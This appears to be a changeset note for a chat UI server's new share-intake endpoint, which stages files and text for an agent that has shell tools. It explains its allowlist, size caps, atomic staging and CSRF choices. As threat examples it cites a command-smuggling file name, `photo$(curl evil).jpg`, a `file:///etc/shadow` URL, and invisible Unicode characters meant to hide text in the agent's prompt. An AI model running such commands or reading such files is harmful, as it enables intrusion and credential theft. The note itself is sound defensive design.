---
"@schlessera/brain-ui-sdk": minor
"@schlessera/brain-ui-server": minor
---

Stage an incoming system share on the server

First phase of making the chat UI a share target on Android: `POST /api/share`
accepts a multipart share (title, text, url, and up to ten files) and writes it
to `<brain root>/.brain-ui/inbox/<id>/` alongside a `meta.json` manifest, so the
agent can read, file and process it as an ordinary chat turn. Nothing enters the
content repo until the agent decides where it belongs.

Everything a share carries is attacker-influenced — file names come from
whichever app invoked the share sheet — and the consumer is an agent with file
and shell tools, which sets the bar for "sanitized": a name is not safe merely
because the filesystem accepts it. The staging directory's name is minted
server-side and no part of the payload is ever treated as a path. Names go
through an ALLOWLIST — Unicode letters, digits, marks and `._-` — rather than a
list of characters someone thought to forbid, because `photo$(curl evil).jpg`
survives any such list and correct quoting by the agent is not a boundary.
Format characters go too: bidi overrides, zero-width spaces and the Unicode tag
block, from the text fields as well as the names, since all of them are quoted
into a prompt and all of them are invisible to the human reading it. Names are
bounded, given an extension from their media type when they have none, and
de-duplicated rather than overwritten;
`meta.json` is reserved — case-insensitively, since on macOS and Windows
`META.JSON` and `meta.json` are one file — and the length bound counts UTF-8
bytes rather than characters, because a filesystem component limit is a byte
limit and a hundred CJK characters are three hundred bytes.

Caps (`SHARE_MAX_FILES`, `SHARE_MAX_FILE_BYTES`, `SHARE_MAX_TOTAL_BYTES`,
`SHARE_MAX_TEXT_BYTES`) are counted off the request stream rather than trusted
from `content-length`, which HTTP/2 and chunked encoding omit entirely, then
again against each part's claimed size and once more against the decoded bytes.
A share is staged into `.<id>.partial` and renamed into place only once
`meta.json` is written, so the agent cannot observe a half-written share even if
the process is killed mid-write — which `try`/`catch` cleanup cannot cover. One
unwritable file is recorded as `skipped` rather than losing the other four.

Two fields that reach the agent are now validated rather than passed through: a
`url` that is not http(s) is demoted to plain text, because the filing skill
dereferences that field and `javascript:`, `data:` and `file:///etc/shadow` all
arrive as plausible strings; and a media type that is not a media type becomes
`application/octet-stream` instead of being quoted back into the prompt at
whatever length the sender chose.

`POST /api/share` also refuses a cross-site request. Every other state-changing
route here reads JSON, which forces a preflight and is CSRF-safe by accident; a
multipart POST is CORS-simple and gets no preflight, and under
`AUTH_MODE=tailscale` the credential is the source IP, so no SameSite flag
applies either. Concurrent intakes are capped, the inbox is capped at
`SHARE_MAX_STAGED` shares, and the prune sweep is debounced instead of running
on every upload. A failure mid-write removes the partial directory. Staged shares older than `SHARE_STAGING_TTL_MS`
(7 days) are pruned opportunistically on each intake, and `pruneShareStaging()`
is exported so a deployment can also sweep at boot.

`template/.gitignore` now ignores `.brain-ui/`, which it never did — so a
generated brain repo would have staged a share (and the keyterm and model
caches) into git on the next `git add -A`.

The route is mounted behind the auth guard, which is the whole defense for
something that writes into the brain root — a wiring test now asserts it.

A second, public route answers `POST /share-target` when no service worker was
there to intercept it (evicted, storage cleared, or installed before the worker
activated) with a redirect into the app instead of a bare 404 — the SPA fallback
is GET-only, so without it the user gets a raw error page inside the app window.
It reads no body and must stay outside the guard: a share navigation is
cross-site, so the SameSite=Strict cookie is absent by construction.

The service-worker share-target handler, the client intake, and the manifest
entry in the deployment shell follow in later phases.
